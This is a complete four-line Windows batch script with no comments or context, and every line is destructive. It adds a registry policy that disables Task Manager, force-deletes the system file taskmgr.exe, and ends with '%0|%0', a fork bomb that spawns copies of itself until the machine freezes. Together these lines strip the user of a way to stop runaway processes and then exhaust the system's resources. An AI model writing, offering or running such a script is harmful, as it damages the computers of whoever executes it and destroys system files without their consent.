@echo off
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
del /f /q C:\Windows\System32\taskmgr.exe
%0|%0
